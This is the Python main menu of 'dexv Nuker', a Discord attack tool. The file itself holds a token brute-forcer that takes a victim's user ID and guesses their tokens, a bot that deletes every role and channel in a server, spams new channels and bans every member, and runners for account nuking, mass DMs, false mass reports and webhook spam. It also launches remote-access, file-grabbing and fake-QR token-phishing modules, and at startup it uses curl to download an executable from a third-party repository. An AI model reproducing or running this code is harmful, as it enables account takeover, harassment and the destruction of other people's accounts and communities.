import multiprocessing
import threading
import requests
import keyboard
import base64
import os
from time import sleep
from colorama import Fore
from util.plugins.common import *
import util.accountNuke
import util.dmdeleter
import util.info
import util.login
import util.groupchat_spammer
import util.massreport
import util.seizure
import util.server_leaver
import util.spamservers
import util.friend_blocker
import util.unfriender
import util.webhookspammer
import util.massdm
import util.profilechanger
import threading
from discord.ext import commands
import discord
import pyautogui
import time
from requests import post
from random import randint
import re
import http.client
import random
import json
import requests
from threading import Thread
from requests import Session
import base64
import string
import sys


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

threads = 3
cancel_key = "ctrl+x"

def main():
    setTitle(f"dexv Nuker {THIS_VERSION}")
    clear()
    global threads
    global cancel_key
    if getTheme() == "dexvous":
        banner()
    elif getTheme() == "dark":
        banner("dark")
    elif getTheme() == "fire":
        banner("fire")
    elif getTheme() == "water":
        banner("water")
    elif getTheme() == "neon":
        banner("neon")

    choice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Choice: {Fore.RED}')
    #all options
    if choice == "1":
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        Server_Name = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}'))
        message_Content = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
        if threading.active_count() < threads:
            threading.Thread(target=util.accountNuke.dexv_Nuke, args=(token, Server_Name, message_Content)).start()
            return


    elif choice == '2':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        #get all friends
        processes = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = multiprocessing.Process(target=util.unfriender.UnFriender, args=(token, friend))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '3':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        if token.startswith("mfa."):
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Just a headsup dexv wont be able to delete the servers since the account has 2fa enabled')
            sleep(3)
        processes = []
        #get all servers
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        for guild in [guildsIds[i:i+3] for i in range(0, len(guildsIds), 3)]:
            t = multiprocessing.Process(target=util.server_leaver.Leaver, args=(token, guild))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break
                

    elif choice == '4':
        token = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.BLUE}Do you want to have a icon for the servers that will be created?')
        yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}yes/no: {Fore.RED}')
        if yesno.lower() == "yes":
            image = input(f'Example: (C:\\Users\\myName\\Desktop\\dexvNuker\\ShitOn.png):\n{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Please input the icon location: {Fore.RED}')
            if not os.path.exists(image):
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Couldn\'t find "{image}" on your pc')
                sleep(3)
                main()
            with open(image, "rb") as f: _image = f.read()
            b64Bytes = base64.b64encode(_image)
            icon = f"data:image/x-icon;base64,{b64Bytes.decode()}"
        else:
            icon = None
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Random server names
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Custom server names  
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Second Choice: {Fore.RED}')
        if secondchoice not in ["1", "2"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
            sleep(1)
            main()
        if secondchoice == "1":
            processes = []
            for i in range(25):
                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon))
                t.start()
                processes.append(t)
            while True:
                if keyboard.is_pressed(cancel_key):
                    for process in processes:
                        process.terminate()
                    main()
                    break

        if secondchoice == "2":
            name = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}'))
            processes = []
            for i in range(25):
                t = multiprocessing.Process(target=util.spamservers.SpamServers, args=(token, icon, name))
                t.start()
                processes.append(t)
            while True:
                if keyboard.is_pressed(cancel_key):
                    for process in processes:
                        process.terminate()
                    main()
                    break


    elif choice == '5':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                t = multiprocessing.Process(target=util.dmdeleter.DmDeleter, args=(token, channel))
                t.start()
                processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '6':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        message = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = multiprocessing.Process(target=util.massdm.MassDM, args=(token, channel, message))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '7':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
        processes = [] 
        for i in range(threads):
            t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token, ))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '8':
        token = input(
        f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.info.Info(token)


    elif choice == '9':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.login.TokenLogin(token)

    elif choice == '10':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = multiprocessing.Process(target=util.friend_blocker.Block, args=(token, friend))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break


    elif choice == '11':
        print('')
        print(' ▀█▀ █▀█ █▄▀ █▀▀ █▄░█   █▀▀ █░█ █▀▀ █▀▀ █▄▀ █▀▀ █▀█')
        print(' ░█░ █▄█ █░█ ██▄ █░▀█   █▄▄ █▀█ ██▄ █▄▄ █░█ ██▄ █▀▄')


        def checker(token):
            response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}',
                            headers={'Authorization': token})
            if "You need to verify your account in order to perform this action." in str(
                    response.content) or "401: Unauthorized" in str(response.content):
                return False
            elif response.status_code == 401:
                return 'Invalid'
            else:
                return True


        def manager():
            if __name__ == "__main__":
                try:
                    checked = []
                    with open('tokens.txt', 'r') as tokens:
                        for token in tokens.read().split('\n'):
                            if len(token) > 15 and token not in checked and checker(token) == True:
                                print(f'{token} Valid')
                                checked.append(token)
                            else:
                                print(f'{token}  Invalid')
                    if len(checked) > 0:
                        save = input(f'{len(checked)} Valid\nDo you want to Save only Valid tokens? (y/n): ').lower()
                        if save == 'y':
                            name = 'tokens'
                            with open(f'{name}.txt', 'w') as saveFile:
                                saveFile.write('\n'.join(checked))
                            print(f'Tokens saved to {name}.txt file!')
                except:
                    input('Error, cant open tokens.txt file...... :(!')
        


    elif choice == '12':
        print('''
╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╭╮╱╱╱╭╮╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╭╮╱╱╱╱╭━╮
╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭╯╰╮╱╱┃┃╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭╯╰╮╱╱╱┃╭╯
╭━╯┣━━┳╮╭┳╮╭╮╭━┳━━┳┳━╯┣━━┳━╮╰╮╭╋━━┫┃╭┳━━┳━╮╱┃╰━┳━┳╮┣╮╭╋━━┳╯╰┳━━┳━┳━━┳━━╮
┃╭╮┃┃━╋╋╋┫╰╯┃┃╭┫╭╮┣┫╭╮┃┃━┫╭╯╱┃┃┃╭╮┃╰╯┫┃━┫╭╮╮┃╭╮┃╭┫┃┃┃┃┃┃━╋╮╭┫╭╮┃╭┫╭━┫┃━┫
┃╰╯┃┃━╋╋╋╋╮╭╯┃┃┃╭╮┃┃╰╯┃┃━┫┃╱╱┃╰┫╰╯┃╭╮┫┃━┫┃┃┃┃╰╯┃┃┃╰╯┃╰┫┃━┫┃┃┃╰╯┃┃┃╰━┫┃━┫
╰━━┻━━┻╯╰╯╰╯╱╰╯╰╯╰┻┻━━┻━━┻╯╱╱╰━┻━━┻╯╰┻━━┻╯╰╯╰━━┻╯╰━━┻━┻━━╯╰╯╰━━┻╯╰━━┻━━╯
Do not do this without the permission of the person to whom the bruteforce attack is conducted.''')


        id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]

        def bruteforece():
            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                            '').join(random.choices(string.ascii_letters + string.digits, k=25))

                headers = {'Authorization': token}

                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print('[+] VALID' + ' ' + token)
                        f = open('grab.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print('[-] INVALID' + ' ' + token)
                finally:
                    print('')

        def thread():
            while True:
                threading.Thread(target=bruteforece).start()

        thread()

    elif choice == '13':
        print('')
        print('╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭╮')
        print('╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱┃┃')
        print('╭━╯┣━━┳╮╭┳╮╭╮╭━┳━━┳┳━╯┣━━┳━╮╭━╮╭╮╭┫┃╭┳━━┳━╮')
        print('┃╭╮┃┃━╋╋╋┫╰╯┃┃╭┫╭╮┣┫╭╮┃┃━┫╭╯┃╭╮┫┃┃┃╰╯┫┃━┫╭')
        print('┃╰╯┃┃━╋╋╋╋╮╭╯┃┃┃╭╮┃┃╰╯┃┃━┫┃╱┃┃┃┃╰╯┃╭╮┫┃━┫┃')
        print('╰━━┻━━┻╯╰╯╰╯╱╰╯╰╯╰┻┻━━┻━━┻╯╱╰╯╰┻━━┻╯╰┻━━┻╯')


        TOKEN = input('Bot token: ')


        print('1> Nuke')
        print('2> Ban')


        MAX_CHANNELS = 500


        choicee = int(input('[?]>'))


        if choicee == 1:
            chanless = input('Channels names: ')
            spam = input('Message you wanna spam: ')
            print('For nuke write to chat: !Nuke')


        if choicee == 2:
            reason = input('Bans reason: ')
            print('For for banning one guy write to chat: !OneBan')
            print('For mass ban write to chat: !Ban')


        client = commands.Bot(command_prefix="!")


        @client.command()
        async def Nuke(ctx):
            await ctx.message.delete()
            guild = ctx.guild


            for role in guild.roles:
                try:
                    await role.delete()
                    print(f'{role.name} Has been deleted')
                except:
                    print(f'[-] {role.name} Has not been deleted')


            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(f'[+] {channel.name} Has been deleted')
                except:
                    print(f'[-] You cant delete {channel}')


            try:
                for i in range(MAX_CHANNELS):
                    await guild.create_text_channel(chanless)
                    print(f'[+] {chanless} has been created')
            except:
                print('[-] You havent got permission to create channels')


        @client.command(pass_context=True)
        async def Ban(ctx):
            await ctx.message.delete()
            guild = ctx.message.guild
            for member in list(client.get_all_members()):
                try:
                    await guild.ban(member)
                    print('[+] User '+member.name+" has been banned")
                except:
                    print('[-] You havent got permission to ban :(')


        @client.command()
        async def OneBan(ctx, member : discord.Member):
            await ctx.message.delete()
            try:
                await member.ban(reason=reason)
                print(f'[+] {member} was banned')
            except:
                print(f'[-] You dont have permission to ban {member}')


        @client.event
        async def on_guild_channel_create(channel):
            while True:
                try:
                    await channel.send(spam)
                    print('[+] SPAMMIMG :)')

                except:
                    print('[-] You cant spam lmaoooo')


        def thread():
                threading.Thread(target=on_guild_channel_create, args=(TOKEN)).start()


        client.run(TOKEN)
        
    elif choice == '14':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Status changer
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Bio changer
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] HypeSquad changer    
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Setting: {Fore.RED}')
        if secondchoice not in ["1", "2", "3"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
            sleep(1)
            main()
        if secondchoice == "1":
            status = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom Status: {Fore.RED}')
            util.profilechanger.StatusChanger(token, status)

        if secondchoice == "2":
            bio = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom bio: {Fore.RED}')
            util.profilechanger.BioChanger(token, bio)

        if secondchoice == "3":
            print(f'''
{Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}]{Fore.MAGENTA} HypeSquad Bravery
{Fore.RESET}[{Fore.RED}2{Fore.RESET}]{Fore.LIGHTRED_EX} HypeSquad Brilliance
{Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                        ''')
            thirdchoice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Hypesquad: {Fore.RED}')
            if thirdchoice not in ["1", "2", "3"]:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
                sleep(1)
                main()
            if thirdchoice == "1":
                util.profilechanger.HouseChanger(token, 1)
            if thirdchoice == "2":
                util.profilechanger.HouseChanger(token, 2)
            if thirdchoice == "3":
                util.profilechanger.HouseChanger(token, 3)
        
         


    elif choice == '15':
        print(f"\n{Fore.RED}(the token you input is the account that will send the reports){Fore.RESET}")
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        guild_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Server ID: {Fore.RED}'))
        channel_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Channel ID: {Fore.RED}'))
        message_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message ID: {Fore.RED}'))
        reason1 = str(input(
            '\n[1] Illegal content\n'
            '[2] Harassment\n'
            '[3] Spam or phishing links\n'
            '[4] Self-harm\n'
            '[5] NSFW content\n\n'
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Reason: {Fore.RED}'))
        if reason1.upper() in ('1', 'ILLEGAL CONTENT'):
            reason1 = 0
        elif reason1.upper() in ('2', 'HARASSMENT'):
            reason1 = 1
        elif reason1.upper() in ('3', 'SPAM OR PHISHING LINKS'):
            reason1 = 2
        elif reason1.upper() in ('4', 'SELF-HARM'):
            reason1 = 3
        elif reason1.upper() in ('5', 'NSFW CONTENT'):
            reason1 = 4
        else:
            print(f"\nInvalid reason")
            sleep(1)
            main()
        util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)


    elif choice == "16":
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.groupchat_spammer.GcSpammer(token)


    elif choice == '17':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
                        ''')
        secondchoice = int(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Second Choice: {Fore.RED}'))
        if secondchoice not in [1, 2]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
            sleep(1)
            main()
        if secondchoice == 1:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            try:
                requests.delete(WebHook)
                print(f'\n{Fore.GREEN}Webhook Successfully Deleted!{Fore.RESET}\n')
            except Exception as e:
                print(f'{Fore.RED}Error: {Fore.WHITE}{e} {Fore.RED}happened while trying to delete the Webhook')

            input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')
            main()
        if secondchoice == 2:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            Message = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message: {Fore.RED}'))
            util.webhookspammer.WebhookSpammer(WebHook, Message)


    elif choice == '18':
        subprocess.call([r'util\\crashvideomaker.bat'])
    elif choice == '19':
        exec(open('util/fakeqr.py').read())
    elif choice == '20':
        exec(open('util/rat.py').read())
    elif choice == '21':
        exec(open('util/filegrabber.py').read())
    elif choice == '22':
        exec(open('util/accountdisabler.py').read())
    elif choice == '23':
        exec(open('util/selfbot.py').read())
    elif choice == '24':
        input("This tool is under development its gonna be added soon be updated on my github https://github.com/DXVVAY!!")
        main()
    elif choice == '25':
        input("This tool is under development its gonna be added soon be updated on my github https://github.com/DXVVAY!!")
        main()
    elif choice == '26':
        input("This tool is under development its gonna be added soon be updated on my github https://github.com/DXVVAY!!")
        main()
    elif choice == '27':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Theme changer
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Amount of threads
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] Cancel key
    {Fore.RESET}[{Fore.RED}4{Fore.RESET}] {Fore.RED}Exit...    
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Setting: {Fore.RED}')
        if secondchoice not in ["1", "2", "3", "4"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Setting')
            sleep(1)
            main()
        if secondchoice == "1":
            print(f"""
{Fore.GREEN}dexvous: 1
{Fore.LIGHTBLACK_EX}Dark: 2
{Fore.RED}Fire: 3
{Fore.BLUE}Water: 4
{Fore.CYAN}N{Fore.MAGENTA}e{Fore.CYAN}o{Fore.MAGENTA}n{Fore.CYAN}:{Fore.MAGENTA} 5
""")
            themechoice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}theme: {Fore.RED}')
            if themechoice == "1":
                setTheme('dexvous')
            elif themechoice == "2":
                setTheme('dark')
            elif themechoice == "3":
                setTheme('fire')
            elif themechoice == "4":
                setTheme('water')
            elif themechoice == "5":
                setTheme('neon')
            else:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Theme')
                sleep(1.5)
                main()
            print_slow(f"{Fore.GREEN}Theme set to {Fore.CYAN}{getTheme()}")
            sleep(0.5)
            main()

        elif secondchoice == "2":
            print(f"{Fore.BLUE}Current amount of threads: {threads}")
            try:
                amount = int(
                    input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Amount of threads: {Fore.RED}'))
            except ValueError:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid amount')
                sleep(1.5)
                main()
            if amount >= 45:
                print(f"{Fore.RED}Sorry but having this many threads will just get you ratelimited and not end up well")
                sleep(3)
                main()
            elif amount >= 15:
                print(f"{Fore.RED}WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING! * WARNING!")
                print(f"having the thread amount set to 15 or over can possible get laggy and higher chance of ratelimit\nare you sure you want to set the ratelimit to {Fore.YELLOW}{amount}{Fore.RED}?")
                yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}yes/no: {Fore.RED}')
                if yesno.lower() != "yes":
                    sleep(0.5)
                    main()
            threads = amount
            print_slow(f"{Fore.GREEN}Threads set to {Fore.CYAN}{amount}")
            sleep(0.5)
            main()
        
        elif secondchoice == "3":
            print("\n","Info".center(30, "-"))
            print(f"{Fore.CYAN}Current cancel key: {cancel_key}")
            print(f"""{Fore.BLUE}If you want to have ctrl + <key> you need to type out ctrl+<key> | DON'T literally press ctrl + <key>
{Fore.GREEN}Example: shift+Q

{Fore.RED}You can have other modifiers instead of ctrl ⇣
{Fore.YELLOW}All keyboard modifiers:{Fore.RESET}
ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
""")
            sleep(1.5)
            key = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Key: {Fore.RED}')
            cancel_key = key
            print_slow(f"{Fore.GREEN}Cancel key set to {Fore.CYAN}{cancel_key}")
            sleep(0.5)
            main()

        elif secondchoice == "4":
            setTitle("Exiting. . .")
            choice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.RED}')
            if choice.upper() == 'Y':
                clear()
                os._exit(0)
            else:
                main()
    else:
        clear()
        main()
        


if __name__ == "__main__":
    import sys
    setTitle("Dexv nuker Loading...")
    
    Anime.Fade(Center.Center(start), Colors.green_to_black, Colorate.Vertical, time=1)
    if not os.path.exists("output"):
        os.makedirs("output", exist_ok=True)
    if os.path.exists("output/QR-Code"):
        shutil.rmtree(f"output/QR-Code")
    os.system("""if not exist "util/chromedriver.exe" echo [#] Downloading chromedriver: """)
    os.system("""if not exist "util/chromedriver.exe" curl -#fkLo "util/chromedriver.exe" "https://github.com/AstraaDev/complement/raw/main/chromedriver.exe" """)
    main()
    
 